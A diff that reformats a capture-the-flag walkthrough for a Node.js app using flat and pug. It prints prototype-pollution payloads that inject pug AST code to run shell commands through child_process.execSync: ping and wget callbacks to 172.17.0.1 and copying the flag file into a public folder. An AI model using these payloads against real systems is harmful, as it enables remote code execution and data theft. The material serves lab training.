@@ -67,11 +67,11 @@ The main files of interest are the `main.js` and `index.js` files, we can also c
 
 ```bash
 ---SNIP---
-	"dependencies": {
-		"express": "^4.17.1",
-		"flat": "5.0.0",
-		"pug": "^3.0.0"
-	}
+  "dependencies": {
+  "express": "^4.17.1",
+  "flat": "5.0.0",
+  "pug": "^3.0.0"
+}
 ---SNIP---
 ```
 
@@ -87,7 +87,7 @@ The one we want to take a real close look at is `challenge/routes/index.js`.
 ```js
 const path              = require('path');
 const express           = require('express');
-const pug        		= require('pug');
+const pug               = require('pug');
 const { unflatten }     = require('flat');
 const router            = express.Router();
 
@@ -98,15 +98,15 @@ router.get('/', (req, res) => {
 router.post('/api/submit', (req, res) => {
     const { artist } = unflatten(req.body);
 
-	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
-		return res.json({
-			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
-		});
-	} else {
-		return res.json({
-			'response': 'Please provide us with the full name of an existing member.'
-		});
-	}
+    if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
+        return res.json({
+            'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
+        });
+    } else {
+        return res.json({
+            'response': 'Please provide us with the full name of an existing member.'
+        });
+    }
 });
 
 module.exports = router;
@@ -193,10 +193,10 @@ We've already figured out that the `pug` package is vulnerable and extracted the
 
 ```json
 {
-	"artist.name":"Haigh","__proto__.block": {
-	"type": "Text", 
-	"line": "process.mainModule.require('child_process').execSync(`ping -c 3 172.17.0.1`)"
-	}
+    "artist.name":"Haigh","__proto__.block": {
+    "type": "Text", 
+    "line": "process.mainModule.require('child_process').execSync(`ping -c 3 172.17.0.1`)"
+    }
 }
 ```
 
@@ -251,10 +251,10 @@ URL = "http://localhost:1337"
 #URL = "http://"
 
 payload ={
-	"artist.name":"Haigh","__proto__.block": {
-	"type": "Text",
+    "artist.name":"Haigh","__proto__.block": {
+    "type": "Text",
         "line": "process.mainModule.require('child_process').execSync(`wget http://172.17.0.1/addasd`)"
-	}
+    }
 }
 
 
@@ -272,10 +272,10 @@ Since we already have a fairly established payload, all we need to do is modify 
 
 ```json
 {
-	"artist.name":"Haigh","__proto__.block": {
-	"type": "Text", 
-	"line": "process.mainModule.require('child_process').execSync(`cp flag* static/test.txt`)"
-	}
+    "artist.name":"Haigh","__proto__.block": {
+    "type": "Text", 
+    "line": "process.mainModule.require('child_process').execSync(`cp flag* static/test.txt`)"
+    }
 }
 ```
 
